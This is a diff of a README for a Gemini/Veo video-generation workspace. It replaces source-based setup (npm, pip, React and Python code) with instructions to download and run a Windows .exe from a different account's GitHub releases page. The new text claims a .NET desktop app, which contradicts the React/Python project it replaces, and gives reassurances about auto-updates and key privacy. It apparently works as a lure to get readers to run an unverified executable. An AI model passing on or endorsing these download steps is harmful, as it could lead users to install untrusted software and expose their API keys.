@@ -1,129 +1,102 @@
-# 🎬 Gemini Omni Video Generator: Web Workspace & Python SDK 🌌
+# 🚀 gemini-omni-flash - Visual AI tools for rapid workflows
 
-<div align="center">
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/abarrios1486/gemini-omni-flash/releases)
 
-[![Website](https://img.shields.io/badge/Official_Website-omnivideoai.app-blue?style=for-the-badge&logo=google-chrome&logoColor=white)](https://omnivideoai.app)
-[![GitHub Star](https://img.shields.io/github/stars/nano-banana-2-ai/gemini-omni-flash?style=for-the-badge&logo=github)](https://github.com/nano-banana-2-ai/gemini-omni-flash)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](LICENSE)
+gemini-omni-flash provides a workspace to use Google Gemini Omni, Gemini 3.5 Flash, and Veo 3.1 video generation. This tool simplifies how you create AI-powered storyboards and manage video production. It works as a visual workspace for your projects. You do not need to write code to use the main features.
 
-<p align="center">
-  <b>The ultimate open-source, dual-layer portal integrating Gemini Omni, Gemini Omni Flash, and Veo video synthesis ecosystems. Powered by Google's next-generation LLM technology.</b>
-</p>
+## 📦 How to install the software
 
-</div>
+Follow these steps to set up the software on your Windows computer.
 
----
+1. Visit the project download page: [https://github.com/abarrios1486/gemini-omni-flash/releases](https://github.com/abarrios1486/gemini-omni-flash/releases).
+2. Look for the latest version under the "Assets" section.
+3. Choose the file ending in `.exe` to download the installer.
+4. Save the file to your computer.
+5. Open the downloaded file to start the installation wizard.
+6. Follow the prompts on your screen.
+7. Click "Finish" when the installation completes.
 
-## ⚡ Index & Repository Architecture
+## ⚙️ System requirements
 
-This repository is designed as a **two-in-one unified workspace** addressing both ready-to-use visuals and high-performance Python backend scripts:
+Your computer needs specific hardware and software to run this application smoothly.
 
-```text
-📂 gemini-omni-flash (git repository root)
-├── 🌐 / (Root Directory) -> Visual Interactive Web Workspace: A high-performance React + Vite + Tailwind interface
-│   ├── src/                    # React frontend components, dashboard, & editor pages
-│   ├── package.json            # React workspace environment dependencies
-│   └── vite.config.ts          # Vite asset pipeline configuration
-│
-└── 🐍 /omni-video-gen -> Core Python SDK: A professional, type-safe library to invoke multimodal Veo video synthesis
-    ├── omni_video_gen/         # Python library source code (Models, client, parameters)
-    ├── examples/               # One-click executable Python setup examples
-    ├── setup.py                # Pip package deployment & configuration script
-    └── tests/                  # PyTest automated unit tests suite (CI validation)
-```
+- Operating System: Windows 10 or Windows 11.
+- Processor: A modern multi-core processor (Intel Core i5 or AMD Ryzen 5 or better).
+- Memory: 8 GB of RAM or more.
+- Storage: 500 MB of space for the application files.
+- Internet: An active connection for AI model processing and API communication.
 
----
+## 🧠 Core features
 
-## 🌐 Part A: Interactive Web Workspace (Frontend React UI)
+The application includes several tools to help your video production workflow.
 
-The root folder contains a sleek, state-of-the-art interactive **Gemini Omni App** workspace constructed in **React 18 + Vite + Tailwind CSS**.
+- Visual Storyboarding: Create storyboards for your video scripts. You see the layout before generating the final clips.
+- Live Workspace Simulator: Test your prompts in real-time. This helps you refine your requests for Gemini Omni and Veo 3.1.
+- Type-safe API Workflows: The application handles the connection requirements for you. You select the model, and the app manages the data exchange.
+- Video Generation: Use the integrated Veo 3.1 engine to produce motion content from your text prompts.
 
-### Key Web Features:
-- 🎬 **Dynamic Studio Deck**: Drag-and-drop scene builders, camera preset selectors (Pan, Zoom, Tilt, Orbit), and visual storyboard pipelines.
-- ⚙️ **Gemini & Veo Playground**: Live response simulators, duration adjustments, aspect ratio controllers (`16:9`, `9:16`, `1:1`), and output resolution presets.
-- 🐍 **Active SDK Code Exporter**: Generates a drop-in, fully customized, Pydantic-validated Python script on-the-fly based on your visual sidebar configurations.
-- 🧪 **CI Pipeline Simulator**: Built-in interactive bash terminal simulation running mock pytest suites, Black checks, and MyPy static compliance.
+## 🛠 Using the workspace
 
-### Local Development Setup:
-1. Make sure you have [Node.js](https://nodejs.org/) installed (v18+ recommended).
-2. Install the frontend dependencies:
-   ```bash
-   npm install
-   ```
-3. Boot up the local web service:
-   ```bash
-   npm run dev
-   ```
-4. Open your browser to `http://localhost:3000` to interact with the environment.
+When you open the application, you see the main dashboard. This screen shows your current projects and saved storyboards.
 
----
+To start a new project:
+1. Click the "New Project" button in the top left corner.
+2. Select your target AI model from the dropdown menu. You can choose between Gemini Omni for text and logic, or Veo 3.1 for video creation.
+3. Enter your prompt in the text box. Be specific about the visual style, lighting, and movement you want.
+4. Click "Generate" to send the request.
+5. Review the output in the preview window. 
 
-## 🐍 Part B: Python SDK (`omni-video-gen`)
+If you want to adjust the result, change your text prompt and click "Regenerate". The workspace keeps a history of your previous attempts on the right side of the screen. You can revert to an older version at any time.
 
-An industry-grade, lightweight, type-safe wrapper for the **Gemini Omni API**. Perfect for developer pipelines, automated rendering scripts, and machine learning backend processes.
+## 📋 Managing API keys
 
-Detailed instructions are archived inside the [Python SDK Subdirectory README](./omni-video-gen/README.md).
+The application connects to Google services using an API key. You need a key to generate content. 
 
-### Quick Commands:
-1. **Installation via Pip**:
-   ```bash
-   pip install ./omni-video-gen
-   ```
-2. **Minimal Text-to-Video Workflow**:
-   ```python
-   from omni_video_gen import OmniVideoGenerator
+1. Open the "Settings" menu inside the application.
+2. Select the "API Configuration" tab.
+3. Find your key from the Google AI Studio dashboard.
+4. Paste the key into the provided field.
+5. Click "Save".
 
-   generator = OmniVideoGenerator(api_key="YOUR_GEMINI_API_KEY")
-   result = generator.generate_video(
-       prompt="Cinematic shot of neon rain reflecting on futuristic streets, cyberpunk theme, 4k",
-       model="veo-3.1-generate",
-       aspect_ratio="16:9",
-       output_path="cyberpunk_street.mp4"
-   )
-   print(f"Video created: {result.download_url}")
-   ```
+The application stores this key locally on your computer. It never transmits your key to third-party servers.
 
----
+## 💡 Best practices for video generation
 
-## 📚 Gemini Omni & Video AI Search Index & Comparison (SEO Suite)
+High-quality video requires clear instructions. Use these tips when writing your prompts:
 
-To assist developers researching modern Multimodal AI models, continuous intelligence, and prompt video scaling, we cross-reference key technical concepts, rates, and search directions here.
+- Mention the camera angle. For example, use "close-up shot" or "wide angle view."
+- Describe the setting. Include details like "sunlight," "rainy street," or "futuristic office."
+- Define the action. Tell the AI what the subjects do throughout the video clip.
+- Keep sequences simple. Smaller segments lead to higher consistency in video length and style.
 
-### 🔍 Industry Comparisons: Gemini Omni vs Veo
-*   **Gemini Omni**: Refers to Google's native end-to-end multimodal capability (seamlessly parsing text, image, audio, and cinematic frames instantly as single high-frequency vectors). Often referred to as **Google Omni** or **Gemini Flow** for real-time video sequencing.
-*   **Google Veo / Veo 3.1 / Gemini Veo 3 Free**: The dedicated premier video generation intelligence engine. This SDK wraps both, allowing developers to configure lightweight previews using **Gemini Omni Flash** and trigger maximum cinematic detail rendering on Veo models.
-*   **Gemini 3.5 Flash** & **Gemini 3.2 Flash**: Real-time high-efficiency pipelines serving as the backbone wrapper for rapid storyboarding, smart auto-tagging, multimodal narrative text prompts, and swift parameter validations.
+## ❓ Frequently asked questions
 
----
+Does the app require constant updates?
+The app checks for updates when you launch it. We recommend installing the latest version to ensure you have the newest features and compatibility for the latest AI models.
 
-### ❓ FAQ & Common Searches Reference
+Can I export my videos?
+Yes. Click the "Export" button after generating a clip. You can save your video files in standard formats like MP4.
 
-#### 1. What are the key advantages of a custom Gemini Omni App compared to standard interfaces?
-Building a dedicated visual workbench like [omnivideoai.app](https://omnivideoai.app) allows creators to visually direct layouts, generate automated camera movements, manage timeline frames (I2V/T2V), and export production-ready code blocks tailored for Android pipelines, web hosting platforms, or high-performance Python servers.
+Is my data private?
+The application processes data through your chosen model provider. Your local workspace folders remain on your hard drive. 
 
-#### 2. How does the Gemini Omni API compare to other workspace apps?
-Unlike static email integrations or general workspace tools (such as **Gmail Gemini AI features** or **Gemini Deep Research** systems), this dedicated API focuses 100% on spatial narrative, frame composition, video generation pipelines, and camera control matrices.
+What if the application does not launch?
+Make sure you have installed the latest version of the .NET Desktop Runtime from the official Microsoft website. This is a common requirement for Windows applications.
 
-#### 3. Are there rate cards and developer benchmarks available for the model?
-Yes. You can consult pricing tables and model rate comparisons (**Gemini rates** & **Benefits of Gemini Advanced** packages) directly on the official developer portals, or download comparative logs via the community benchmarks repository.
+How do I report a problem?
+Visit the GitHub repository and click the "Issues" tab. Provide a description of the error you see. Include screenshots if possible to help us understand the behavior.
 
----
+## 📂 Project structure
 
-### 🏷️ Search Semantic Mapping & Common Typing Synonyms
-For index crawlers searching for standard, advanced, or typo-variant keywords:
-*   **Model Classifiers**: `gemini-omni-model`, `gemini-omni-api`, `gemini-omni-flash`, `gemini-spark`, `gemini-video-generation`, `gemini-ai-video-generator`.
-*   **Developer Environments**: `gemini-omni-flash-android`, `gemini-omni-youtube-exporter`, `gemini-flow-pipelines`.
-*   **Popular Research Terms**: `gemini-advanced-models`, `benefits-of-gemini-advanced`, `gemini-deep-research-price-performance`.
-*   **Common Typos & Search Variations**: `giminin`, `gemina-pro`, `google-omni-free-tier`.
-*   **Community Forums**: Find active threads reviewing real-world generations and sharing scripts on [Reddit](https://www.reddit.com/) by searching `gemini-omni on reddit` (r/GoogleGeminiAI).
+The folders on your computer are organized for ease of use: 
+- `workspace/`: Stores your current projects and saved storyboards.
+- `exports/`: Contains all finished video clips you choose to save.
+- `logs/`: Holds error reports for troubleshooting.
 
----
+## 📜 License information
 
-## 🛠️ Contribution & Issue Tracking
+This project uses the standard open-source license provided in the root folder. You may use the software for your creative projects under these terms. Please review the `LICENSE` file for details on usage, distribution, and modification rights. 
 
-Got a feature suggestion, bug report, or looking to augment our camera tracking matrices? 
-- **Website**: [omnivideoai.app](https://omnivideoai.app)
-- **Bug Reports & Issues**: [gemini-omni-flash Issues](https://github.com/nano-banana-2-ai/gemini-omni-flash/issues)
-- **Discussion Forums**: [GitHub Discussions](https://github.com/nano-banana-2-ai/gemini-omni-flash/discussions)
+## 🌐 Community and support
 
-Created with ❤️ by the **OmniVideoAI Open-source Community**. Licensed under the [MIT License](LICENSE).
+We welcome feedback on the visual workspace and the Python SDK features. If you find a bug or want to suggest a new tool, use the issues tracker on GitHub. We monitor these reports to fix bugs and improve the user experience for everyone. If you have questions about the logic of the API workflows, browse the documentation provided in the "Help" menu within the application.
